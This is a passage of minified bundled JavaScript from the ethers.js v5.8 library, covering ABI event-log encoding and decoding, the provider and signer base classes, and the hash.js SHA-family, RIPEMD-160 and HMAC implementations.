a=e.inputs[o];if(!a.indexed){s!=null&&Qt.throwArgumentError("cannot filter non-indexed parameters; must be null","contract."+a.name,s);return}s==null?n.push(null):a.baseType==="array"||a.baseType==="tuple"?Qt.throwArgumentError("filtering with tuples or arrays not supported","contract."+a.name,s):Array.isArray(s)?n.push(s.map(c=>i(a,c))):n.push(i(a,s))});n.length&&n[n.length-1]===null;)n.pop();return n}encodeEventLog(e,r){typeof e=="string"&&(e=this.getEvent(e));const n=[],i=[],s=[];return e.anonymous||n.push(this.getEventTopic(e)),r.length!==e.inputs.length&&Qt.throwArgumentError("event arguments/values mismatch","values",r),e.inputs.forEach((o,a)=>{const c=r[a];if(o.indexed)if(o.type==="string")n.push(nc(c));else if(o.type==="bytes")n.push(fr(c));else{if(o.baseType==="tuple"||o.baseType==="array")throw new Error("not implemented");n.push(this._abiCoder.encode([o.type],[c]))}else i.push(o),s.push(c)}),{data:this._abiCoder.encode(i,s),topics:n}}decodeEventLog(e,r,n){if(typeof e=="string"&&(e=this.getEvent(e)),n!=null&&!e.anonymous){let d=this.getEventTopic(e);(!Ye(n[0],32)||n[0].toLowerCase()!==d)&&Qt.throwError("fragment/topic mismatch",H.errors.INVALID_ARGUMENT,{argument:"topics[0]",expected:d,value:n[0]}),n=n.slice(1)}let i=[],s=[],o=[];e.inputs.forEach((d,g)=>{d.indexed?d.type==="string"||d.type==="bytes"||d.baseType==="tuple"||d.baseType==="array"?(i.push(br.fromObject({type:"bytes32",name:d.name})),o.push(!0)):(i.push(d),o.push(!1)):(s.push(d),o.push(!1))});let a=n!=null?this._abiCoder.decode(i,Pn(n)):null,c=this._abiCoder.decode(s,r,!0),u=[],l=0,h=0;e.inputs.forEach((d,g)=>{if(d.indexed)if(a==null)u[g]=new U0({_isIndexed:!0,hash:null});else if(o[g])u[g]=new U0({_isIndexed:!0,hash:a[h++]});else try{u[g]=a[h++]}catch(y){u[g]=y}else try{u[g]=c[l++]}catch(y){u[g]=y}if(d.name&&u[d.name]==null){const y=u[g];y instanceof Error?Object.defineProperty(u,d.name,{enumerable:!0,get:()=>{throw jA(`property ${JSON.stringify(d.name)}`,y)}}):u[d.name]=y}});for(let d=0;d<u.length;d++){const g=u[d];g instanceof Error&&Object.defineProperty(u,d,{enumerable:!0,get:()=>{throw jA(`index ${d}`,g)}})}return Object.freeze(u)}parseTransaction(e){let r=this.getFunction(e.data.substring(0,10).toLowerCase());return r?new PK({args:this._abiCoder.decode(r.inputs,"0x"+e.data.substring(10)),functionFragment:r,name:r.name,signature:r.format(),sighash:this.getSighash(r),value:ne.from(e.value||"0")}):null}parseLog(e){let r=this.getEvent(e.topics[0]);return!r||r.anonymous?null:new TK({eventFragment:r,name:r.name,signature:r.format(),topic:this.getEventTopic(r),args:this.decodeEventLog(r,e.data,e.topics)})}parseError(e){const r=we(e);let n=this.getError(r.substring(0,10).toLowerCase());return n?new RK({args:this._abiCoder.decode(n.inputs,"0x"+r.substring(10)),errorFragment:n,name:n.name,signature:n.format(),sighash:this.getSighash(n)}):null}static isInterface(e){return!!(e&&e._isInterface)}}const kK="abstract-provider/5.8.0";var DK=function(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})};const MK=new H(kK);class BK extends mh{static isForkEvent(e){return!!(e&&e._isForkEvent)}}class np{constructor(){MK.checkAbstract(new.target,np),X(this,"_isProvider",!0)}getFeeData(){return DK(this,void 0,void 0,function*(){const{block:e,gasPrice:r}=yield sr({block:this.getBlock("latest"),gasPrice:this.getGasPrice().catch(o=>null)});let n=null,i=null,s=null;return e&&e.baseFeePerGas&&(n=e.baseFeePerGas,s=ne.from("1500000000"),i=e.baseFeePerGas.mul(2).add(s)),{lastBaseFeePerGas:n,maxFeePerGas:i,maxPriorityFeePerGas:s,gasPrice:r}})}addListener(e,r){return this.on(e,r)}removeListener(e,r){return this.off(e,r)}static isProvider(e){return!!(e&&e._isProvider)}}const UK="abstract-signer/5.8.0";var ni=function(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})};const jn=new H(UK),$K=["accessList","ccipReadEnabled","chainId","customData","data","from","gasLimit","gasPrice","maxFeePerGas","maxPriorityFeePerGas","nonce","to","type","value"],LK=[H.errors.INSUFFICIENT_FUNDS,H.errors.NONCE_EXPIRED,H.errors.REPLACEMENT_UNDERPRICED];class bh{constructor(){jn.checkAbstract(new.target,bh),X(this,"_isSigner",!0)}getBalance(e){return ni(this,void 0,void 0,function*(){return this._checkProvider("getBalance"),yield this.provider.getBalance(this.getAddress(),e)})}getTransactionCount(e){return ni(this,void 0,void 0,function*(){return this._checkProvider("getTransactionCount"),yield this.provider.getTransactionCount(this.getAddress(),e)})}estimateGas(e){return ni(this,void 0,void 0,function*(){this._checkProvider("estimateGas");const r=yield sr(this.checkTransaction(e));return yield this.provider.estimateGas(r)})}call(e,r){return ni(this,void 0,void 0,function*(){this._checkProvider("call");const n=yield sr(this.checkTransaction(e));return yield this.provider.call(n,r)})}sendTransaction(e){return ni(this,void 0,void 0,function*(){this._checkProvider("sendTransaction");const r=yield this.populateTransaction(e),n=yield this.signTransaction(r);return yield this.provider.sendTransaction(n)})}getChainId(){return ni(this,void 0,void 0,function*(){return this._checkProvider("getChainId"),(yield this.provider.getNetwork()).chainId})}getGasPrice(){return ni(this,void 0,void 0,function*(){return this._checkProvider("getGasPrice"),yield this.provider.getGasPrice()})}getFeeData(){return ni(this,void 0,void 0,function*(){return this._checkProvider("getFeeData"),yield this.provider.getFeeData()})}resolveName(e){return ni(this,void 0,void 0,function*(){return this._checkProvider("resolveName"),yield this.provider.resolveName(e)})}checkTransaction(e){for(const n in e)$K.indexOf(n)===-1&&jn.throwArgumentError("invalid transaction key: "+n,"transaction",e);const r=pr(e);return r.from==null?r.from=this.getAddress():r.from=Promise.all([Promise.resolve(r.from),this.getAddress()]).then(n=>(n[0].toLowerCase()!==n[1].toLowerCase()&&jn.throwArgumentError("from address mismatch","transaction",e),n[0])),r}populateTransaction(e){return ni(this,void 0,void 0,function*(){const r=yield sr(this.checkTransaction(e));r.to!=null&&(r.to=Promise.resolve(r.to).then(i=>ni(this,void 0,void 0,function*(){if(i==null)return null;const s=yield this.resolveName(i);return s==null&&jn.throwArgumentError("provided ENS name resolves to null","tx.to",i),s})),r.to.catch(i=>{}));const n=r.maxFeePerGas!=null||r.maxPriorityFeePerGas!=null;if(r.gasPrice!=null&&(r.type===2||n)?jn.throwArgumentError("eip-1559 transaction do not support gasPrice","transaction",e):(r.type===0||r.type===1)&&n&&jn.throwArgumentError("pre-eip-1559 transaction do not support maxFeePerGas/maxPriorityFeePerGas","transaction",e),(r.type===2||r.type==null)&&r.maxFeePerGas!=null&&r.maxPriorityFeePerGas!=null)r.type=2;else if(r.type===0||r.type===1)r.gasPrice==null&&(r.gasPrice=this.getGasPrice());else{const i=yield this.getFeeData();if(r.type==null)if(i.maxFeePerGas!=null&&i.maxPriorityFeePerGas!=null)if(r.type=2,r.gasPrice!=null){const s=r.gasPrice;delete r.gasPrice,r.maxFeePerGas=s,r.maxPriorityFeePerGas=s}else r.maxFeePerGas==null&&(r.maxFeePerGas=i.maxFeePerGas),r.maxPriorityFeePerGas==null&&(r.maxPriorityFeePerGas=i.maxPriorityFeePerGas);else i.gasPrice!=null?(n&&jn.throwError("network does not support EIP-1559",H.errors.UNSUPPORTED_OPERATION,{operation:"populateTransaction"}),r.gasPrice==null&&(r.gasPrice=i.gasPrice),r.type=0):jn.throwError("failed to get consistent fee data",H.errors.UNSUPPORTED_OPERATION,{operation:"signer.getFeeData"});else r.type===2&&(r.maxFeePerGas==null&&(r.maxFeePerGas=i.maxFeePerGas),r.maxPriorityFeePerGas==null&&(r.maxPriorityFeePerGas=i.maxPriorityFeePerGas))}return r.nonce==null&&(r.nonce=this.getTransactionCount("pending")),r.gasLimit==null&&(r.gasLimit=this.estimateGas(r).catch(i=>{if(LK.indexOf(i.code)>=0)throw i;return jn.throwError("cannot estimate gas; transaction may fail or may require manual gas limit",H.errors.UNPREDICTABLE_GAS_LIMIT,{error:i,tx:r})})),r.chainId==null?r.chainId=this.getChainId():r.chainId=Promise.all([Promise.resolve(r.chainId),this.getChainId()]).then(i=>(i[1]!==0&&i[0]!==i[1]&&jn.throwArgumentError("chainId address mismatch","transaction",e),i[0])),yield sr(r)})}_checkProvider(e){this.provider||jn.throwError("missing provider",H.errors.UNSUPPORTED_OPERATION,{operation:e||"_checkProvider"})}static isSigner(e){return!!(e&&e._isSigner)}}class Zy extends bh{constructor(e,r){super(),X(this,"address",e),X(this,"provider",r||null)}getAddress(){return Promise.resolve(this.address)}_fail(e,r){return Promise.resolve().then(()=>{jn.throwError(e,H.errors.UNSUPPORTED_OPERATION,{operation:r})})}signMessage(e){return this._fail("VoidSigner cannot sign messages","signMessage")}signTransaction(e){return this._fail("VoidSigner cannot sign transactions","signTransaction")}_signTypedData(e,r,n){return this._fail("VoidSigner cannot sign typed data","signTypedData")}connect(e){return new Zy(this.address,e)}}var Kg={},ut={},Qg,zA;function vh(){if(zA)return Qg;zA=1,Qg=t;function t(e,r){if(!e)throw new Error(r||"Assertion failed")}return t.equal=function(r,n,i){if(r!=n)throw new Error(i||"Assertion failed: "+r+" != "+n)},Qg}var ed={exports:{}},HA;function FK(){return HA||(HA=1,typeof Object.create=="function"?ed.exports=function(e,r){r&&(e.super_=r,e.prototype=Object.create(r.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}))}:ed.exports=function(e,r){if(r){e.super_=r;var n=function(){};n.prototype=r.prototype,e.prototype=new n,e.prototype.constructor=e}}),ed.exports}var WA;function Ki(){if(WA)return ut;WA=1;var t=vh(),e=FK();ut.inherits=e;function r(L,N){return(L.charCodeAt(N)&64512)!==55296||N<0||N+1>=L.length?!1:(L.charCodeAt(N+1)&64512)===56320}function n(L,N){if(Array.isArray(L))return L.slice();if(!L)return[];var f=[];if(typeof L=="string")if(N){if(N==="hex")for(L=L.replace(/[^a-z0-9]+/ig,""),L.length%2!==0&&(L="0"+L),w=0;w<L.length;w+=2)f.push(parseInt(L[w]+L[w+1],16))}else for(var p=0,w=0;w<L.length;w++){var E=L.charCodeAt(w);E<128?f[p++]=E:E<2048?(f[p++]=E>>6|192,f[p++]=E&63|128):r(L,w)?(E=65536+((E&1023)<<10)+(L.charCodeAt(++w)&1023),f[p++]=E>>18|240,f[p++]=E>>12&63|128,f[p++]=E>>6&63|128,f[p++]=E&63|128):(f[p++]=E>>12|224,f[p++]=E>>6&63|128,f[p++]=E&63|128)}else for(w=0;w<L.length;w++)f[w]=L[w]|0;return f}ut.toArray=n;function i(L){for(var N="",f=0;f<L.length;f++)N+=a(L[f].toString(16));return N}ut.toHex=i;function s(L){var N=L>>>24|L>>>8&65280|L<<8&16711680|(L&255)<<24;return N>>>0}ut.htonl=s;function o(L,N){for(var f="",p=0;p<L.length;p++){var w=L[p];N==="little"&&(w=s(w)),f+=c(w.toString(16))}return f}ut.toHex32=o;function a(L){return L.length===1?"0"+L:L}ut.zero2=a;function c(L){return L.length===7?"0"+L:L.length===6?"00"+L:L.length===5?"000"+L:L.length===4?"0000"+L:L.length===3?"00000"+L:L.length===2?"000000"+L:L.length===1?"0000000"+L:L}ut.zero8=c;function u(L,N,f,p){var w=f-N;t(w%4===0);for(var E=new Array(w/4),x=0,R=N;x<E.length;x++,R+=4){var B;p==="big"?B=L[R]<<24|L[R+1]<<16|L[R+2]<<8|L[R+3]:B=L[R+3]<<24|L[R+2]<<16|L[R+1]<<8|L[R],E[x]=B>>>0}return E}ut.join32=u;function l(L,N){for(var f=new Array(L.length*4),p=0,w=0;p<L.length;p++,w+=4){var E=L[p];N==="big"?(f[w]=E>>>24,f[w+1]=E>>>16&255,f[w+2]=E>>>8&255,f[w+3]=E&255):(f[w+3]=E>>>24,f[w+2]=E>>>16&255,f[w+1]=E>>>8&255,f[w]=E&255)}return f}ut.split32=l;function h(L,N){return L>>>N|L<<32-N}ut.rotr32=h;function d(L,N){return L<<N|L>>>32-N}ut.rotl32=d;function g(L,N){return L+N>>>0}ut.sum32=g;function y(L,N,f){return L+N+f>>>0}ut.sum32_3=y;function m(L,N,f,p){return L+N+f+p>>>0}ut.sum32_4=m;function b(L,N,f,p,w){return L+N+f+p+w>>>0}ut.sum32_5=b;function A(L,N,f,p){var w=L[N],E=L[N+1],x=p+E>>>0,R=(x<p?1:0)+f+w;L[N]=R>>>0,L[N+1]=x}ut.sum64=A;function _(L,N,f,p){var w=N+p>>>0,E=(w<N?1:0)+L+f;return E>>>0}ut.sum64_hi=_;function T(L,N,f,p){var w=N+p;return w>>>0}ut.sum64_lo=T;function P(L,N,f,p,w,E,x,R){var B=0,k=N;k=k+p>>>0,B+=k<N?1:0,k=k+E>>>0,B+=k<E?1:0,k=k+R>>>0,B+=k<R?1:0;var v=L+f+w+x+B;return v>>>0}ut.sum64_4_hi=P;function S(L,N,f,p,w,E,x,R){var B=N+p+E+R;return B>>>0}ut.sum64_4_lo=S;function C(L,N,f,p,w,E,x,R,B,k){var v=0,M=N;M=M+p>>>0,v+=M<N?1:0,M=M+E>>>0,v+=M<E?1:0,M=M+R>>>0,v+=M<R?1:0,M=M+k>>>0,v+=M<k?1:0;var V=L+f+w+x+B+v;return V>>>0}ut.sum64_5_hi=C;function O(L,N,f,p,w,E,x,R,B,k){var v=N+p+E+R+k;return v>>>0}ut.sum64_5_lo=O;function $(L,N,f){var p=N<<32-f|L>>>f;return p>>>0}ut.rotr64_hi=$;function D(L,N,f){var p=L<<32-f|N>>>f;return p>>>0}ut.rotr64_lo=D;function F(L,N,f){return L>>>f}ut.shr64_hi=F;function j(L,N,f){var p=L<<32-f|N>>>f;return p>>>0}return ut.shr64_lo=j,ut}var Yg={},GA;function Eh(){if(GA)return Yg;GA=1;var t=Ki(),e=vh();function r(){this.pending=null,this.pendingTotal=0,this.blockSize=this.constructor.blockSize,this.outSize=this.constructor.outSize,this.hmacStrength=this.constructor.hmacStrength,this.padLength=this.constructor.padLength/8,this.endian="big",this._delta8=this.blockSize/8,this._delta32=this.blockSize/32}return Yg.BlockHash=r,r.prototype.update=function(i,s){if(i=t.toArray(i,s),this.pending?this.pending=this.pending.concat(i):this.pending=i,this.pendingTotal+=i.length,this.pending.length>=this._delta8){i=this.pending;var o=i.length%this._delta8;this.pending=i.slice(i.length-o,i.length),this.pending.length===0&&(this.pending=null),i=t.join32(i,0,i.length-o,this.endian);for(var a=0;a<i.length;a+=this._delta32)this._update(i,a,a+this._delta32)}return this},r.prototype.digest=function(i){return this.update(this._pad()),e(this.pending===null),this._digest(i)},r.prototype._pad=function(){var i=this.pendingTotal,s=this._delta8,o=s-(i+this.padLength)%s,a=new Array(o+this.padLength);a[0]=128;for(var c=1;c<o;c++)a[c]=0;if(i<<=3,this.endian==="big"){for(var u=8;u<this.padLength;u++)a[c++]=0;a[c++]=0,a[c++]=0,a[c++]=0,a[c++]=0,a[c++]=i>>>24&255,a[c++]=i>>>16&255,a[c++]=i>>>8&255,a[c++]=i&255}else for(a[c++]=i&255,a[c++]=i>>>8&255,a[c++]=i>>>16&255,a[c++]=i>>>24&255,a[c++]=0,a[c++]=0,a[c++]=0,a[c++]=0,u=8;u<this.padLength;u++)a[c++]=0;return a},Yg}var No={},Ii={},VA;function zx(){if(VA)return Ii;VA=1;var t=Ki(),e=t.rotr32;function r(l,h,d,g){if(l===0)return n(h,d,g);if(l===1||l===3)return s(h,d,g);if(l===2)return i(h,d,g)}Ii.ft_1=r;function n(l,h,d){return l&h^~l&d}Ii.ch32=n;function i(l,h,d){return l&h^l&d^h&d}Ii.maj32=i;function s(l,h,d){return l^h^d}Ii.p32=s;function o(l){return e(l,2)^e(l,13)^e(l,22)}Ii.s0_256=o;function a(l){return e(l,6)^e(l,11)^e(l,25)}Ii.s1_256=a;function c(l){return e(l,7)^e(l,18)^l>>>3}Ii.g0_256=c;function u(l){return e(l,17)^e(l,19)^l>>>10}return Ii.g1_256=u,Ii}var Jg,KA;function jK(){if(KA)return Jg;KA=1;var t=Ki(),e=Eh(),r=zx(),n=t.rotl32,i=t.sum32,s=t.sum32_5,o=r.ft_1,a=e.BlockHash,c=[1518500249,1859775393,2400959708,3395469782];function u(){if(!(this instanceof u))return new u;a.call(this),this.h=[1732584193,4023233417,2562383102,271733878,3285377520],this.W=new Array(80)}return t.inherits(u,a),Jg=u,u.blockSize=512,u.outSize=160,u.hmacStrength=80,u.padLength=64,u.prototype._update=function(h,d){for(var g=this.W,y=0;y<16;y++)g[y]=h[d+y];for(;y<g.length;y++)g[y]=n(g[y-3]^g[y-8]^g[y-14]^g[y-16],1);var m=this.h[0],b=this.h[1],A=this.h[2],_=this.h[3],T=this.h[4];for(y=0;y<g.length;y++){var P=~~(y/20),S=s(n(m,5),o(P,b,A,_),T,g[y],c[P]);T=_,_=A,A=n(b,30),b=m,m=S}this.h[0]=i(this.h[0],m),this.h[1]=i(this.h[1],b),this.h[2]=i(this.h[2],A),this.h[3]=i(this.h[3],_),this.h[4]=i(this.h[4],T)},u.prototype._digest=function(h){return h==="hex"?t.toHex32(this.h,"big"):t.split32(this.h,"big")},Jg}var Zg,QA;function Hx(){if(QA)return Zg;QA=1;var t=Ki(),e=Eh(),r=zx(),n=vh(),i=t.sum32,s=t.sum32_4,o=t.sum32_5,a=r.ch32,c=r.maj32,u=r.s0_256,l=r.s1_256,h=r.g0_256,d=r.g1_256,g=e.BlockHash,y=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298];function m(){if(!(this instanceof m))return new m;g.call(this),this.h=[1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225],this.k=y,this.W=new Array(64)}return t.inherits(m,g),Zg=m,m.blockSize=512,m.outSize=256,m.hmacStrength=192,m.padLength=64,m.prototype._update=function(A,_){for(var T=this.W,P=0;P<16;P++)T[P]=A[_+P];for(;P<T.length;P++)T[P]=s(d(T[P-2]),T[P-7],h(T[P-15]),T[P-16]);var S=this.h[0],C=this.h[1],O=this.h[2],$=this.h[3],D=this.h[4],F=this.h[5],j=this.h[6],L=this.h[7];for(n(this.k.length===T.length),P=0;P<T.length;P++){var N=o(L,l(D),a(D,F,j),this.k[P],T[P]),f=i(u(S),c(S,C,O));L=j,j=F,F=D,D=i($,N),$=O,O=C,C=S,S=i(N,f)}this.h[0]=i(this.h[0],S),this.h[1]=i(this.h[1],C),this.h[2]=i(this.h[2],O),this.h[3]=i(this.h[3],$),this.h[4]=i(this.h[4],D),this.h[5]=i(this.h[5],F),this.h[6]=i(this.h[6],j),this.h[7]=i(this.h[7],L)},m.prototype._digest=function(A){return A==="hex"?t.toHex32(this.h,"big"):t.split32(this.h,"big")},Zg}var Xg,YA;function qK(){if(YA)return Xg;YA=1;var t=Ki(),e=Hx();function r(){if(!(this instanceof r))return new r;e.call(this),this.h=[3238371032,914150663,812702999,4144912697,4290775857,1750603025,1694076839,3204075428]}return t.inherits(r,e),Xg=r,r.blockSize=512,r.outSize=224,r.hmacStrength=192,r.padLength=64,r.prototype._digest=function(i){return i==="hex"?t.toHex32(this.h.slice(0,7),"big"):t.split32(this.h.slice(0,7),"big")},Xg}var em,JA;function Wx(){if(JA)return em;JA=1;var t=Ki(),e=Eh(),r=vh(),n=t.rotr64_hi,i=t.rotr64_lo,s=t.shr64_hi,o=t.shr64_lo,a=t.sum64,c=t.sum64_hi,u=t.sum64_lo,l=t.sum64_4_hi,h=t.sum64_4_lo,d=t.sum64_5_hi,g=t.sum64_5_lo,y=e.BlockHash,m=[1116352408,3609767458,1899447441,602891725,3049323471,3964484399,3921009573,2173295548,961987163,4081628472,1508970993,3053834265,2453635748,2937671579,2870763221,3664609560,3624381080,2734883394,310598401,1164996542,607225278,1323610764,1426881987,3590304994,1925078388,4068182383,2162078206,991336113,2614888103,633803317,3248222580,3479774868,3835390401,2666613458,4022224774,944711139,264347078,2341262773,604807628,2007800933,770255983,1495990901,1249150122,1856431235,1555081692,3175218132,1996064986,2198950837,2554220882,3999719339,2821834349,766784016,2952996808,2566594879,3210313671,3203337956,3336571891,1034457026,3584528711,2466948901,113926993,3758326383,338241895,168717936,666307205,1188179964,773529912,1546045734,1294757372,1522805485,1396182291,2643833823,1695183700,2343527390,1986661051,1014477480,2177026350,1206759142,2456956037,344077627,2730485921,1290863460,2820302411,3158454273,3259730800,3505952657,3345764771,106217008,3516065817,3606008344,3600352804,1432725776,4094571909,1467031594,275423344,851169720,430227734,3100823752,506948616,1363258195,659060556,3750685593,883997877,3785050280,958139571,3318307427,1322822218,3812723403,1537002063,2003034995,1747873779,3602036899,1955562222,1575990012,2024104815,1125592928,2227730452,2716904306,2361852424,442776044,2428436474,593698344,2756734187,3733110249,3204031479,2999351573,3329325298,3815920427,3391569614,3928383900,3515267271,566280711,3940187606,3454069534,4118630271,4000239992,116418474,1914138554,174292421,2731055270,289380356,3203993006,460393269,320620315,685471733,587496836,852142971,1086792851,1017036298,365543100,1126000580,2618297676,1288033470,3409855158,1501505948,4234509866,1607167915,987167468,1816402316,1246189591];function b(){if(!(this instanceof b))return new b;y.call(this),this.h=[1779033703,4089235720,3144134277,2227873595,1013904242,4271175723,2773480762,1595750129,1359893119,2917565137,2600822924,725511199,528734635,4215389547,1541459225,327033209],this.k=m,this.W=new Array(160)}t.inherits(b,y),em=b,b.blockSize=1024,b.outSize=512,b.hmacStrength=192,b.padLength=128,b.prototype._prepareBlock=function(f,p){for(var w=this.W,E=0;E<32;E++)w[E]=f[p+E];for(;E<w.length;E+=2){var x=j(w[E-4],w[E-3]),R=L(w[E-4],w[E-3]),B=w[E-14],k=w[E-13],v=D(w[E-30],w[E-29]),M=F(w[E-30],w[E-29]),V=w[E-32],I=w[E-31];w[E]=l(x,R,B,k,v,M,V,I),w[E+1]=h(x,R,B,k,v,M,V,I)}},b.prototype._update=function(f,p){this._prepareBlock(f,p);var w=this.W,E=this.h[0],x=this.h[1],R=this.h[2],B=this.h[3],k=this.h[4],v=this.h[5],M=this.h[6],V=this.h[7],I=this.h[8],z=this.h[9],G=this.h[10],W=this.h[11],K=this.h[12],ae=this.h[13],ee=this.h[14],J=this.h[15];r(this.k.length===w.length);for(var Te=0;Te<w.length;Te+=2){var ie=ee,ye=J,Vr=O(I,z),ze=$(I,z),tt=A(I,z,G,W,K),yn=_(I,z,G,W,K,ae),Ze=this.k[Te],We=this.k[Te+1],wn=w[Te],Xe=w[Te+1],He=d(ie,ye,Vr,ze,tt,yn,Ze,We,wn,Xe),Kr=g(ie,ye,Vr,ze,tt,yn,Ze,We,wn,Xe);ie=S(E,x),ye=C(E,x),Vr=T(E,x,R,B,k),ze=P(E,x,R,B,k,v);var et=c(ie,ye,Vr,ze),rt=u(ie,ye,Vr,ze);ee=K,J=ae,K=G,ae=W,G=I,W=z,I=c(M,V,He,Kr),z=u(V,V,He,Kr),M=k,V=v,k=R,v=B,R=E,B=x,E=c(He,Kr,et,rt),x=u(He,Kr,et,rt)}a(this.h,0,E,x),a(this.h,2,R,B),a(this.h,4,k,v),a(this.h,6,M,V),a(this.h,8,I,z),a(this.h,10,G,W),a(this.h,12,K,ae),a(this.h,14,ee,J)},b.prototype._digest=function(f){return f==="hex"?t.toHex32(this.h,"big"):t.split32(this.h,"big")};function A(N,f,p,w,E){var x=N&p^~N&E;return x<0&&(x+=4294967296),x}function _(N,f,p,w,E,x){var R=f&w^~f&x;return R<0&&(R+=4294967296),R}function T(N,f,p,w,E){var x=N&p^N&E^p&E;return x<0&&(x+=4294967296),x}function P(N,f,p,w,E,x){var R=f&w^f&x^w&x;return R<0&&(R+=4294967296),R}function S(N,f){var p=n(N,f,28),w=n(f,N,2),E=n(f,N,7),x=p^w^E;return x<0&&(x+=4294967296),x}function C(N,f){var p=i(N,f,28),w=i(f,N,2),E=i(f,N,7),x=p^w^E;return x<0&&(x+=4294967296),x}function O(N,f){var p=n(N,f,14),w=n(N,f,18),E=n(f,N,9),x=p^w^E;return x<0&&(x+=4294967296),x}function $(N,f){var p=i(N,f,14),w=i(N,f,18),E=i(f,N,9),x=p^w^E;return x<0&&(x+=4294967296),x}function D(N,f){var p=n(N,f,1),w=n(N,f,8),E=s(N,f,7),x=p^w^E;return x<0&&(x+=4294967296),x}function F(N,f){var p=i(N,f,1),w=i(N,f,8),E=o(N,f,7),x=p^w^E;return x<0&&(x+=4294967296),x}function j(N,f){var p=n(N,f,19),w=n(f,N,29),E=s(N,f,6),x=p^w^E;return x<0&&(x+=4294967296),x}function L(N,f){var p=i(N,f,19),w=i(f,N,29),E=o(N,f,6),x=p^w^E;return x<0&&(x+=4294967296),x}return em}var tm,ZA;function zK(){if(ZA)return tm;ZA=1;var t=Ki(),e=Wx();function r(){if(!(this instanceof r))return new r;e.call(this),this.h=[3418070365,3238371032,1654270250,914150663,2438529370,812702999,355462360,4144912697,1731405415,4290775857,2394180231,1750603025,3675008525,1694076839,1203062813,3204075428]}return t.inherits(r,e),tm=r,r.blockSize=1024,r.outSize=384,r.hmacStrength=192,r.padLength=128,r.prototype._digest=function(i){return i==="hex"?t.toHex32(this.h.slice(0,12),"big"):t.split32(this.h.slice(0,12),"big")},tm}var XA;function HK(){return XA||(XA=1,No.sha1=jK(),No.sha224=qK(),No.sha256=Hx(),No.sha384=zK(),No.sha512=Wx()),No}var rm={},e1;function WK(){if(e1)return rm;e1=1;var t=Ki(),e=Eh(),r=t.rotl32,n=t.sum32,i=t.sum32_3,s=t.sum32_4,o=e.BlockHash;function a(){if(!(this instanceof a))return new a;o.call(this),this.h=[1732584193,4023233417,2562383102,271733878,3285377520],this.endian="little"}t.inherits(a,o),rm.ripemd160=a,a.blockSize=512,a.outSize=160,a.hmacStrength=192,a.padLength=64,a.prototype._update=function(b,A){for(var _=this.h[0],T=this.h[1],P=this.h[2],S=this.h[3],C=this.h[4],O=_,$=T,D=P,F=S,j=C,L=0;L<80;L++){var N=n(r(s(_,c(L,T,P,S),b[h[L]+A],u(L)),g[L]),C);_=C,C=S,S=r(P,10),P=T,T=N,N=n(r(s(O,c(79-L,$,D,F),b[d[L]+A],l(L)),y[L]),j),O=j,j=F,F=r(D,10),D=$,$=N}N=i(this.h[1],P,F),this.h[1]=i(this.h[2],S,j),this.h[2]=i(this.h[3],C,O),this.h[3]=i(this.h[4],_,$),this.h[4]=i(this.h[0],T,D),this.h[0]=N},a.prototype._digest=function(b){return b==="hex"?t.toHex32(this.h,"little"):t.split32(this.h,"little")};function c(m,b,A,_){return m<=15?b^A^_:m<=31?b&A|~b&_:m<=47?(b|~A)^_:m<=63?b&_|A&~_:b^(A|~_)}function u(m){return m<=15?0:m<=31?1518500249:m<=47?1859775393:m<=63?2400959708:2840853838}function l(m){return m<=15?1352829926:m<=31?1548603684:m<=47?1836072691:m<=63?2053994217:0}var h=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8,3,10,14,4,9,15,8,1,2,7,0,6,13,11,5,12,1,9,11,10,0,8,12,4,13,3,7,15,14,5,6,2,4,0,5,9,7,12,2,10,14,1,3,8,11,6,15,13],d=[5,14,7,0,9,2,11,4,13,6,15,8,1,10,3,12,6,11,3,7,0,13,5,10,14,15,8,12,4,9,1,2,15,5,1,3,7,14,6,9,11,8,12,2,10,0,4,13,8,6,4,1,3,11,15,0,5,12,2,13,9,7,10,14,12,15,10,4,1,5,8,7,6,2,13,14,0,3,9,11],g=[11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8,7,6,8,13,11,9,7,15,7,12,15,9,11,7,13,12,11,13,6,7,14,9,13,15,14,8,13,6,5,12,7,5,11,12,14,15,14,15,9,8,9,14,5,6,8,6,5,12,9,15,5,11,6,8,13,12,5,12,13,14,11,8,5,6],y=[8,9,9,11,13,15,15,5,7,7,8,11,14,14,12,6,9,13,15,7,12,8,9,11,7,7,12,7,6,15,13,11,9,7,15,11,8,6,6,14,12,13,5,14,13,13,7,5,15,5,8,11,14,14,6,14,6,9,12,9,12,5,15,8,8,5,12,9,12,5,14,6,8,13,6,5,15,13,11,11];return rm}var nm,t1;function GK(){if(t1)return nm;t1=1;var t=Ki(),e=vh();function r(n,i,s){if(!(this instanceof r))return new r(n,i,s);this.Hash=n,this.blockSize=n.blockSize/8,this.outSize=n.outSize/8,this.inner=null,this.outer=null,this._init(t.toArray(i,s))}return nm=r,r.prototype._init=function(i){i.length>this.blockSize&&(i=new this.Hash().update(i).digest()),e(i.length<=this.blockSize);for(var s=i.length;s<this.blockSize;s++)i.push(0);for(s=0;s<i.length;s++)i[s]^=54;for(this.inner=new this.Hash().update(i),s=0;s<i.length;s++)i[s]^=106;this.outer=new this.Hash().update(i)},r.prototype.update=function(i,s){return 